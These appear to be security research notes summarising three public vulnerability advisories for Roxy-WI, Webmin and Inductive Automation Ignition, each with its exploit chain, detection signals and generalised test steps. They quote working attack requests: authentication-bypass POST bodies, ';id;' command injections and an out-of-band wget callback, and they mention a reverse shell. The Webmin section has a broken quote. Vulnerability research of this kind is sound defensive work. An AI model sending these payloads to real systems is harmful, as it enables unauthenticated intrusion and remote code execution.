STATUS: UNVERIFIED (not reproduced — no Roxy-WI instance was stood up this pass; every quote and request below is verbatim from the fetched advisory).
CLASS: authentication bypass + command injection / RCE — a single request parameter (`alert_consumer`) whose PRESENCE skips the session/token check on the ajax endpoint `options.py`, which then concatenates user parameters into `ssh_command()` / `subprocess_execute()` / `os.system()` sinks (CWE-287 -> CWE-78).
CORE METHOD:
  1. THE ENDPOINT (advisory verbatim): "The functionalities on the application send an ajax request to the `options.py` file, and all operations are performed here. On the other hand, access to files on the application front-end is provided with adequate session controls, while access to `options.py` is controlled via a local variable."
  2. THE BYPASS (advisory verbatim, the code): `if form.getvalue('alert_consumer') is None:` / `if not sql.check_token_exists(form.getvalue("token")):` / `print('error: Your token has been expired')` / `sys.exit()` — the token check is INSIDE the `if alert_consumer is None:` branch, so any non-null `alert_consumer` skips authentication entirely. "Lines between 29 and 32, it shows that session control can be bypassed if the `alert_consumer` variable is defined and not null in the body of the request sent to the options.py."
  3. THE FIRST REQUEST (advisory verbatim): `POST /app/options.py` with body `alert_consumer=notNull&serv=roxy-wi.access.log&rows1=10&grep=&exgrep=&hour=00&minut=00&hour1=23&minut1=45` — no cookie, no token.
  4. SINK #1 — `ssh_command` (advisory verbatim): `commands = ["openssl x509 -in " + cert_path + "/" + cert_id + " -text"]` then `funct.ssh_command(serv, commands, ip="1")`; `ssh_command` runs `ssh.exec_command(command, get_pty=True)` on the target server. Trigger: `show_versions=1&token=&alert_consumer=1&serv=127.0.0.1&getcert=;id;` — the `;id;` is concatenated into the openssl command. "the `ssh_command` function was used on 34 different lines, and it was seen that 15+ of them were affected by the vulnerability."
  5. SINK #2 — `subprocess_execute` (advisory verbatim): `cmd = 'echo "show servers state"|nc %s %s |grep "%s" |awk \'{print $4}\'' % (serv, haproxy_sock_port, backend)` then `funct.subprocess_execute(cmd)` where `subprocess.Popen(cmd, ..., shell=True, ...)`. Trigger: `alert_consumer=1&serv=127.0.0.1&ipbackend=";id+##&backend_server=127.0.0.1`. "the `subprocess_execute` function was used on 85 different lines, and it was seen that 50+ of them were affected by the vulnerability."
  6. SINK #3 — `os.system` (advisory verbatim): `os.system("mv %s %s" % (name, cert_local_dir))` with `name = form.getvalue('ssl_name')`. Trigger: `show_versions=1&token=&alert_consumer=notNull&serv=127.0.0.1&delcert=a%20&%20wget%20<id>.oastify.com;`.
DETECTION SIGNAL: an ajax/admin endpoint whose authentication is a LOCAL VARIABLE / a branch on a request parameter rather than a session check; the tell is an `if <param> is None: <auth check>` guard — supplying the parameter skips the check. Then look for the endpoint's parameters concatenated into a command string (`ssh_command`, `subprocess_execute(..., shell=True)`, `os.system("mv %s %s" % ...)`).
CHAIN: any unauthenticated attacker (primitive: can POST to `/app/options.py`) -> supplying `alert_consumer` (any non-null value) skips the token check (bypass: an inverted/null-check auth gate) -> the endpoint's `getcert`/`ipbackend`/`delcert` parameters are concatenated into shell commands (primitive) -> `;id;` / `";id+##` / `a & wget <oast>` inject commands (bypass) -> command execution on the Roxy-WI host and, via `ssh_command`, on every managed server (impact: unauthenticated RCE; advisory CVSS 10.0).
TRANSFERABLE TEST: for every ajax/admin/API endpoint — (1) grep the handler for an auth check nested inside `if <param> is None:` / `if not <param>:` (a parameter whose PRESENCE disables the check); (2) send the endpoint's documented feature-flag parameter (an ajax marker, `show_versions`, `alert_consumer`, a `callback`) with any non-null value and NO cookie/token; (3) if the response is authenticated data, the gate is presence-gated; (4) then set each remaining parameter to `;id;`, `";id+##`, `` `id` ``, `$(id)` and watch for command output or an OOB callback. Rule: **an auth check nested inside `if <param> is None:` is bypassed by SUPPLYING that parameter — the presence of a feature-flag parameter is the authentication.**

CORE METHOD:
  1. THE MODULE (article verbatim): "To exploit this vulnerability, the user must have access to the 'Software Package Updates' module." The module lives in `/package-updates/`; the entry file is `update.cgi`, which reads the `u` parameter ("specifying the package name from the user", line 39).
  2. THE TWO PATHS (article verbatim): "the file takes the 'u' parameter (line 39.) specifying the package name from the user and checks whether the 'confirm' parameter (line 50.) is present in the request.   3. THE SAFE PATH (article verbatim): "the commands are executed with the '&backquote_command()' function. Again, we understand from the naming convention that the commands run on the system are safely controlled within this function and the user is prevented from injecting commands here." — the preview path uses a sanitizing wrapper.
  4. THE UNSAFE PATH (article verbatim): "In 'update.cgi', we see that the 'package_install()' function is used on line 129 if a package is to be installed, apart from the if block where the 'confirm' parameter that we examined at first is checked." -> `package_install()` -> `update_system_install()` (called with `$name` at line 345) -> `apt-lib.pl`'s `update_system_install()`, where "on line 18 ... the first parameter of the function (ie the package name that the user sent before) is assigned to a variable named as '$update'. Then, on line 26, we see that this variable is included in the command without any control (Ex: apt-get -y install user_controlled_variable). And finally, in line 46, we observe that the relevant command is executed directly on the system, again without any control mechanism."
  5. THE IMPACT (article verbatim): "Therefore, we can run commands on the system with root privileges by providing the 'confirm' parameter in a new package installation request and giving a value to run a command on the system in the package name!"

Also: a package-manager / OS-operation module whose "package name" parameter is free text.
CHAIN: an authenticated Webmin user with access to the Software Package Updates module (primitive: low-priv authenticated) -> the `u` (package name) parameter is free text (primitive) -> the no-`confirm` path sanitizes via `backquote_command()` (a decoy) but the `confirm` path concatenates the value into `apt-get -y install <name>` (bypass: the safe wrapper is skipped on the install branch) -> `;id;` / `$(cmd)` / backticks in the package name execute as root (escalation: command injection) -> root RCE on the Webmin host (impact: critical; CVE-2022-36446).
TRANSFERABLE TEST: for any feature with a preview/list path and a confirm/apply/install path — (1) locate the sanitizing wrapper used on the preview path (a `*_command()` helper, an escaping function, a parameterised API); (2) trace the SAME user value through the confirm/apply path and check whether the wrapper is applied there too; (3) if the confirm path interpolates the value into a shell string, submit `<value>;id;#` (or `$(id)`, backticks) and grep the response/log for command output. Rule: **a sanitizing wrapper applied on the preview path but not the confirm path is a command-injection bypass — diff the two code paths for the wrapper, and the missing-wrapper path is the sink.**

SOURCE: https://sector7.computest.nl/post/2022-07-inductive-automation-ignition-rce/  2026-11-12

Metadata: DEFION Research Labs, "Pwn2Own Miami 2022: Inductive Automation Ignition Remote Code Execution", published 2022-07-22; CVE-2022-35871; fixed in 8.1.17 / 7.9.20.
STATUS: UNVERIFIED (not reproduced — no Ignition instance was stood up this pass; every quote below is verbatim from the fetched article).
CLASS: authentication bypass (SSO) + remote code execution — an AD SSO handler that validates only the SHAPE of the auth challenge (a username and a domain string) and never verifies a password, token, or signature, followed by an authenticated `ScriptInvoke` endpoint that executes arbitrary Python as `SYSTEM` (CWE-287 -> CWE-78).
CORE METHOD:
  1. THE HANDLER (article verbatim, decompiled `ActiveDirectoryUserSource.class`): `protected AuthenticatedUser authenticateAdSso(AuthChallenge challenge) throws Exception { String ssoUname = (String)challenge.get(User.Username); String ssoDomain = (String)challenge.get(ADSSOAuthChallenge.ADDomain); ... if (StringUtils.isBlank(ssoUname)) { return null; } if (StringUtils.isBlank(ssoDomain)) { return null; } if (ssoDomain.equalsIgnoreCase(this.domain)) { User existingUser = this.userSource.findSSOUser(ssoUname); if (existingUser != null) return (AuthenticatedUser)new BasicAuthenticatedUser(existingUser, new Date()); ... } return null; }`
  2. THE MISSING CHECK (article verbatim): "This function receives an `AuthChallenge` object (essentially a JSON dictionary). It checks that it contains a key for the username and a key for the SSO domain. Then it compares the value for the SSO domain to the configured Active Directory domain name. If it matches, it looks up the username using LDAP and, if found, returns it as an `AuthenticatedUser` object. There's no check here for a password, token, signature, or anything like that. The only data that needs to be submitted to the server is the username and the Active Directory domain name. In other words, the vulnerability here is that there is no SSO implementation at all!"
  3. THE RECON (article verbatim): "There is an unauthenticated API endpoint on the admin interface returning the list of all projects: `http://<server IP>/data/perspective/projects`" — needed to find "the name of a project using this authentication method". The username "simply had to be any existing AD user, regardless of permissions in AD or Ignition. So, we could just use 'Administrator', as that user will always exist in AD". The AD domain name "we didn't find a way to obtain automatically from Ignition. In practice, that value should be easy to obtain when attacking a company ... it would just be the company's primary domain name, or the value might leak in email headers, file metadata, etc."
  4. THE RCE (article verbatim): "There is a `ScriptInvoke` gateway API endpoint with an `execute` function. Authenticated users can submit Python code to this endpoint, which is executed on the server with the same privileges as the server (on Windows, this is `SYSTEM`). ... This does not appear to require any special role or permissions, so this design looks risky to us, but it does seem to function as designed." The article used "a reverse shell implemented in Python" to set up the callback.
DETECTION SIGNAL: an SSO/AD/kerberos auth handler whose challenge is a JSON/dictionary of identity fields; the tell is a handler that returns an authenticated user after checking only that required keys are present and that one string equals a configured value (no password, no token, no signature, no IdP round-trip). Then enumerate the authenticated API for a script-execute endpoint (`ScriptInvoke`, `execute`, a "run script" feature) that any authenticated user can call.
CHAIN: any unauthenticated attacker who can reach the gateway API (primitive) -> the AD SSO handler accepts a challenge carrying just a username + the AD domain (bypass: shape-validated, never proven) -> the attacker is authenticated as any AD user, e.g. `Administrator` (escalation: authentication bypass) -> the authenticated `ScriptInvoke`/`execute` endpoint runs attacker Python as `SYSTEM` (escalation: code execution) -> reverse shell on the Ignition host -> PLC/ICS manipulation (impact: critical RCE; CVE-2022-35871).
TRANSFERABLE TEST: for any SSO/AD/kerberos flow — (1) capture the authentication challenge (the JSON/dictionary the client posts) and enumerate its required fields; (2) check whether the server verifies a password, a token, a signature, or a response from an IdP — or only that the fields are present and one matches a config value; (3) if only shape is checked, authenticate as a known/any user (e.g. `Administrator`); (4) then enumerate the authenticated API for a code-execution feature (`ScriptInvoke`, `execute`, a script/eval endpoint) and call it. Rule: **an SSO handler that validates the shape of the challenge but never verifies proof is an authentication bypass — the required fields ARE the credentials; pair it with any authenticated code-execution feature for RCE.**
